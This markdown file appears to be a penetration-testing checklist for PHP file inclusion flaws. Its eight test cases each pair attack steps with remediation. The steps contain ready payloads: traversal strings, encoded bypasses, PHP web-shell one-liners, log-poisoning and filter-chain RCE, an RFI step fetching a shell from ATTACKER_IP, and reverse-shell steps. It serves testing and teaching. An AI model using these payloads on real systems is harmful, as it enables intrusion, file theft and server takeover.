# File Inclusion Test Cases

> This file is a companion to `SKILL.md`, containing structured test cases organized by category and severity.

---

## Statistics

| Category | Count | Severity Range |
|----------|-------|----------------|
| A. LFI Detection | 1 | HIGH |
| B. Path Traversal Bypass | 1 | HIGH |
| C. PHP Wrapper Exploitation | 1 | CRITICAL |
| D. Log Poisoning RCE | 1 | CRITICAL |
| E. RFI Exploitation | 1 | CRITICAL |
| F. Automated Fuzzing | 1 | MEDIUM |
| G. LFI-to-RCE Escalation | 1 | CRITICAL |
| H. Advanced LFI Techniques | 1 | HIGH |
| **Total** | **8** | **MEDIUM - CRITICAL** |

---

## A. LFI Detection

### TC-FI-001: Basic Local File Inclusion Detection

| Field | Value |
|------|------|
| **ID** | TC-FI-001 |
| **Name** | Basic Local File Inclusion Detection |
| **Category** | A. LFI Detection |
| **Severity** | HIGH |
| **Objective** | Detect whether the target application is vulnerable to local file inclusion through user-controlled file path parameters |
| **Prerequisites** | Target application has parameters accepting file paths (such as `page=`, `file=`, `path=`, `template=`, `lang=`, `doc=`) |
| **Test Steps** | 1. Identify file inclusion parameters via URL analysis and parameter fuzzing<br>2. Test basic traversal: `../../../etc/passwd`<br>3. Test absolute path: `/etc/passwd`<br>4. Test with `....//....//....//etc/passwd` (filter bypass)<br>5. Confirm with secondary file: `../../../etc/hostname`<br>6. Use ffuf with SecLists LFI wordlist for automated discovery |
| **Expected Results** | Application returns contents of system files, confirming user-controlled file inclusion |
| **Actual Impact** | Attacker can read sensitive system files including `/etc/passwd`, configuration files, and application source code |
| **Remediation** | Validate input against a whitelist of allowed values, use `open_basedir` restriction, canonicalize paths with `realpath()` |

---

## B. Path Traversal Bypass

### TC-FI-002: Encoding and Filter Bypass Techniques

| Field | Value |
|------|------|
| **ID** | TC-FI-002 |
| **Name** | Encoding and Filter Bypass Techniques |
| **Category** | B. Path Traversal Bypass |
| **Severity** | HIGH |
| **Objective** | Bypass input validation and WAF filtering using encoding techniques to achieve file inclusion despite security controls |
| **Prerequisites** | LFI vulnerability confirmed (TC-FI-001), but basic traversal payloads are filtered or blocked |
| **Test Steps** | 1. URL encoding: `%2e%2e/%2e%2e/%2e%2e/etc/passwd`<br>2. Double URL encoding: `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd`<br>3. Null byte injection: `../../../etc/passwd%00` (PHP < 5.3.4)<br>4. Unicode encoding: `..%c0%af..%c0%af..%c0%afetc/passwd`<br>5. Filter stripping bypass: `....//....//....//etc/passwd`<br>6. Path truncation with padding to exceed 4096 byte limit (PHP < 5.3)<br>7. Automated fuzzing with `dotdotpwn -m http -h target -u "/page=TRAVERSAL" -o unix` |
| **Expected Results** | At least one encoding technique bypasses the filter and returns `/etc/passwd` contents |
| **Actual Impact** | Attacker bypasses input validation and WAF rules to achieve file inclusion despite security controls |
| **Remediation** | Canonicalize file paths server-side with `realpath()`, reject paths containing encoded traversal sequences, validate resolved path is within allowed directory |

---

## C. PHP Wrapper Exploitation

### TC-FI-003: PHP Stream Wrapper Code Execution

| Field | Value |
|------|------|
| **ID** | TC-FI-003 |
| **Name** | PHP Stream Wrapper Code Execution |
| **Category** | C. PHP Wrapper Exploitation |
| **Severity** | CRITICAL |
| **Objective** | Achieve remote code execution through PHP stream wrappers (php://input, data://, filter chains) without writing files to disk |
| **Prerequisites** | Target runs PHP with LFI vulnerability confirmed; `allow_url_include` may need to be On for some wrappers |
| **Test Steps** | 1. Source disclosure: `php://filter/convert.base64-encode/resource=index.php` → decode base64 output<br>2. Direct code execution: `php://input` with POST body `<?php system("id"); ?>`<br>3. Data URI: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`<br>4. PHP filter chain: use `php_filter_chain_generator.py --chain '<?php system("id"); ?>'` to generate payload<br>5. Verify command execution with `whoami` and `id`<br>6. Attempt reverse shell via successful wrapper |
| **Expected Results** | PHP code is executed through one or more stream wrappers, providing command execution on the server |
| **Actual Impact** | Remote code execution through PHP stream wrappers without writing files to disk |
| **Remediation** | Disable `php://input`, `data://`, `phar://` wrappers in php.ini; set `allow_url_include = Off`; use `open_basedir` to restrict file system access |

---

## D. Log Poisoning RCE

### TC-FI-004: Log Poisoning to Remote Code Execution

| Field | Value |
|------|------|
| **ID** | TC-FI-004 |
| **Name** | Log Poisoning to Remote Code Execution |
| **Category** | D. Log Poisoning RCE |
| **Severity** | CRITICAL |
| **Objective** | Escalate LFI to RCE by injecting PHP code into web server log files and including them through the LFI vulnerability |
| **Prerequisites** | LFI vulnerability confirmed; web server logs are readable through LFI; PHP code in headers is logged without sanitization |
| **Test Steps** | 1. Inject PHP payload into User-Agent header: `<?php system($_GET['cmd']); ?>`<br>2. Send request to any page on target to ensure payload is logged<br>3. Include log file via LFI: `../../../var/log/apache2/access.log&cmd=id`<br>4. Try alternative log locations: `/var/log/nginx/access.log`, `/var/log/httpd/access_log`, `/var/log/apache2/error.log`<br>5. If log poisoning fails, try `/proc/self/environ` with injected User-Agent<br>6. If session file inclusion is viable, inject PHP into session variable and include `/tmp/sess_SESSIONID`<br>7. Use kadimus for automated log poisoning: `kadimus -u "URL" --auto` |
| **Expected Results** | PHP code injected into log file is executed when the log file is included, providing command execution |
| **Actual Impact** | Local file inclusion escalated to full remote code execution without `allow_url_include` or special PHP wrappers |
| **Remediation** | Restrict log file permissions so web server process cannot read them; sanitize HTTP headers before logging; configure logs outside web root; set `open_basedir` to prevent including log files |

---

## E. RFI Exploitation

### TC-FI-005: Remote File Inclusion Exploitation

| Field | Value |
|------|------|
| **ID** | TC-FI-005 |
| **Name** | Remote File Inclusion Exploitation |
| **Category** | E. RFI Exploitation |
| **Severity** | CRITICAL |
| **Objective** | Achieve direct remote code execution by including attacker-hosted malicious files through the RFI vulnerability |
| **Prerequisites** | Target application has file inclusion vulnerability; PHP `allow_url_include = On`; attacker has a server reachable from the target |
| **Test Steps** | 1. Create malicious PHP file: `<?php system($_GET['cmd']); ?>`<br>2. Start HTTP server: `python3 -m http.server 80`<br>3. Test RFI: `http://target/page=http://ATTACKER_IP/shell.txt&cmd=id`<br>4. Try different extensions if `.php` is filtered: `.txt`, `.jpg`, `.png`<br>5. Try null byte to bypass suffix appending: `http://ATTACKER_IP/shell.txt%00`<br>6. On success, deploy reverse shell payload and start netcat listener<br>7. Test PHP `auto_prepend_file` abuse via `.user.ini` if upload directory is writable |
| **Expected Results** | Remote PHP file is included and executed by the target, providing direct code execution |
| **Actual Impact** | Direct remote code execution by including attacker-hosted malicious file, no log poisoning or wrapper tricks needed |
| **Remediation** | Set `allow_url_include = Off` in php.ini; set `allow_url_fopen = Off` if remote file access is not needed; whitelist allowed include values; use static file paths instead of dynamic includes |

---

## F. Automated Fuzzing

### TC-FI-006: dotdotpwn Automated Path Traversal Fuzzing

| Field | Value |
|------|------|
| **ID** | TC-FI-006 |
| **Name** | dotdotpwn Automated Path Traversal Fuzzing |
| **Category** | F. Automated Fuzzing |
| **Severity** | MEDIUM |
| **Objective** | Use automated fuzzing tools to discover working traversal patterns and bypass techniques that may be missed by manual testing |
| **Prerequisites** | Target URL with suspected file inclusion parameter identified; dotdotpwn installed |
| **Test Steps** | 1. Run dotdotpwn in HTTP GET mode: `dotdotpwn.pl -m http -h target -u "/page=TRAVERSAL" -o unix`<br>2. Run with specific file target: `dotdotpwn.pl -m http -h target -u "/page=TRAVERSAL" -f /etc/shadow -o unix`<br>3. Test Windows targets with `-o windows` flag<br>4. Use POST mode for form parameters: `dotdotpwn.pl -m http -h target -x POST -d "page=TRAVERSAL" -o unix`<br>5. Combine with ffuf for parameter discovery: `ffuf -u "http://target/FUZZ=../../../etc/passwd" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt`<br>6. Review dotdotpwn output for successful traversal patterns |
| **Expected Results** | dotdotpwn identifies working traversal patterns that bypass input filters, revealing accessible files |
| **Actual Impact** | Automated discovery reduces manual testing time and finds bypass techniques that may be missed manually |
| **Remediation** | Implement comprehensive input validation that handles all encoding variations; use path canonicalization before validation |

---

## G. LFI-to-RCE Escalation

### TC-FI-007: PHP Filter Chain Arbitrary Code Execution

| Field | Value |
|------|------|
| **ID** | TC-FI-007 |
| **Name** | PHP Filter Chain Arbitrary Code Execution |
| **Category** | G. LFI-to-RCE Escalation |
| **Severity** | CRITICAL |
| **Objective** | Achieve RCE through PHP filter chain payloads that work without allow_url_include or special PHP configuration |
| **Prerequisites** | LFI vulnerability confirmed (TC-FI-001); PHP filter chain generator tool available; target runs PHP 7.x or 8.x |
| **Test Steps** | 1. Generate filter chain payload: `python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'`<br>2. Use generated chain as LFI parameter value: `page=php://filter/convert.iconv.UTF8.CSISO2022KR|.../resource=php://temp`<br>3. Verify command output in HTTP response<br>4. Generate reverse shell filter chain and execute<br>5. Confirm shell access on listener port |
| **Expected Results** | PHP code is executed through the filter chain without requiring `allow_url_include`, file write access, or any PHP wrapper beyond the standard filter protocol |
| **Actual Impact** | Remote code execution achieved through pure LFI with no special PHP configuration requirements beyond a standard PHP installation |
| **Remediation** | Disable unused PHP filter converters in php.ini; use `open_basedir` to restrict accessible paths; implement WAF rules to detect long filter chain payloads |

---

## H. Advanced LFI Techniques

### TC-FI-008: PHP Temporary File Race Condition to RCE

| Field | Value |
|------|------|
| **ID** | TC-FI-008 |
| **Name** | PHP Temporary File Race Condition to RCE |
| **Category** | H. Advanced LFI Techniques |
| **Severity** | HIGH |
| **Objective** | Exploit the transient existence of PHP temporary upload files to achieve code execution through a race condition
| **Prerequisites** | LFI vulnerability confirmed (TC-FI-001); target has a file upload functionality; PHP temporary files stored in a predictable or discoverable location |
| **Test Steps** | 1. Start continuous LFI inclusion loop targeting `/tmp/phpXXXXXX` patterns: `while true; do curl -s "http://target/page=/tmp/phpFUZZ" 2>/dev/null; done`<br>2. Simultaneously upload PHP file via POST: `curl -X POST "http://target/upload" -F "file=@shell.php"`<br>3. Use ffuf for faster brute-force: `ffuf -u "http://target/page=/tmp/FUZZ" -w php_tmp_wordlist.txt -mc 200`<br>4. If successful, the uploaded PHP code executes during the race window<br>5. Alternative: target `/proc/self/fd/X` file descriptors for opened temp files |
| **Expected Results** | PHP code from the uploaded temporary file is executed during the brief window before PHP cleans up the temp file. Success rate depends on timing and server load |
| **Actual Impact** | Remote code execution achieved without persistent file write, exploiting the transient nature of PHP file upload handling |
| **Remediation** | Store uploaded files outside the web root; disable PHP execution in the temp directory; use `open_basedir` to prevent including files from `/tmp` and `/proc` |

---

## Pass Criteria Checklist

- [ ] LFI vulnerability confirmed through basic traversal payloads
- [ ] Encoding bypass techniques tested (URL, double-URL, null byte, Unicode)
- [ ] PHP wrapper exploitation verified (php://filter, php://input, data://)
- [ ] Filter chain RCE achieved or confirmed not applicable
- [ ] Log poisoning to RCE tested against all log file locations
- [ ] RFI tested (if allow_url_include enabled)
- [ ] Automated fuzzing completed with dotdotpwn
- [ ] Race condition exploitation attempted (if upload functionality present)
- [ ] All findings documented with severity, impact, and remediation steps
